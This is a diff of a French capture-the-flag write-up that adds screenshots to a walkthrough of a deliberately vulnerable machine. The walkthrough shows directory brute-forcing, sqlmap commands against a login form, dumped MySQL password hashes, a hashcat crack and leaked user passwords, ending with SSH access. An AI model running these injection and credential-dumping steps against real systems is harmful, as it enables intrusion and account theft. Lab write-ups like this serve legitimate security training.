@@ -25,15 +25,22 @@ Je vois en réponse les ports suivants :
 22/tcp open     ssh
 1337/tcp open   http Apache httpd 2.4.7 ((Ubuntu))
 ```
+![Page Initiale](1.png "Premier screen") 
 
-Je me rends donc sur la page et cherche une suite de fichiers. J'essaie d'abord des chemins comme `/assets/`, `robots.txt`, `../` mais rien ne fonctionne. Je passe ensuite à DirBuster et trouve le répertoire `/icon/`.
+Je me rends donc sur la page et cherche une suite de fichiers. J'essaie d'abord des chemins comme `/assets/`, `robots.txt`, `../` mais rien ne fonctionne. Je passe ensuite à DirBuster 
+
+![Page Initiale](2.png "Premier screen") 
+
+et trouve le répertoire `/icon/`.
+
+![Page Initiale](3.png "Premier screen") 
 
 ---
 
 ## Étape 2 : Découverte du fichier caché
 
 À partir de `/icon/`, j'obtiens ce code HTML :
-
+![Page Initiale](4.png "Premier screen") 
 ```
 <html>
 <img src="/images/hipster.jpg" align="middle">
@@ -54,7 +61,7 @@ Je décode à nouveau cette chaîne pour obtenir :
 /978345210/index.php
 ```
 Je rajoute cela à l'URL et je me retrouve sur un champ de connexion.
-
+![Page Initiale](5.png "Premier screen") 
 ---
 
 ## Étape 3 : Exploitation avec SQL Injection
@@ -62,6 +69,7 @@ Je rajoute cela à l'URL et je me retrouve sur un champ de connexion.
 ### 1er payload SQLMap
 
 Je commence par utiliser SQLMap pour trouver des informations dans la base MySQL :
+![Page Initiale](6.png "Premier screen") 
 ```
 sqlmap -o -u "http://212.83.175.116:1337/978345210/index.php" --forms -D mysql -T user -C User,Password --dump
 ```
@@ -77,10 +85,16 @@ sqlmap -o -u "http://212.83.175.116:1337/978345210/index.php" --forms -D mysql -
 
 SQLMap trouve un champ de mot de passe vulnérable à l'injection SQL. Voici les informations extraites :
 ```
-[18:41:06] [INFO] fetching number of password hashes for user 'root'
-[18:41:06] [INFO] retrieved: 1
-[18:41:07] [INFO] fetching password hashes for user 'root'
-[18:41:07] [INFO] retrieved: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
++------------------+--------------------------------------------------------+
+| User             | Password                                               |
++------------------+--------------------------------------------------------+
+| debian-sys-maint | *A55A9B9049F69BC2768C9284615361DFBD580B34              |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
++------------------+--------------------------------------------------------+
+
 ```
 
 J'utilise ensuite Hashcat pour cracker le hash avec la wordlist `rockyou.txt` :
@@ -94,7 +108,7 @@ Le mot de passe trouvé est :
 ```
 4dd56158acdba81bfe3ff9d3d7375231596ce10f:darkshadow
 ```
-
+Ho la fête
 ---
 
 ## Étape 4 : Accès SSH
@@ -107,6 +121,7 @@ sqlmap -u http://212.129.28.21:1337/978345210/index.php --method POST --data "us
 ```
 
 SQLMap extrait la table `Users` de la base `Webapp` :
+![Page Initiale](7.png "Premier screen") 
 ```
 +----+----------+------------------+
 | id | username | password         |
@@ -118,12 +133,16 @@ SQLMap extrait la table `Users` de la base `Webapp` :
 | 5  | gimli    | AndMyAxe         |
 +----+----------+------------------+
 ```
-Je me connecte via SSH avec `smeagol` :
+Ducoup je le passe sur la page de login:
+![Page Initiale](8.png "Premier screen") 
+
+Je me connecte via SSH avec `smeagol` (il n'y avait que lui qui marchait):
 ```
 ssh smeagol@[ip]
 ```
-
-Une fois connecté, je constate que MySQL tourne en root.
+![Page Initiale](9.png "Premier screen") 
+Une fois connecté apres beaucoup de recherche je constate que MySQL tourne en root.
+![Page Initiale](10.png "Premier screen") 
 
 ---
 
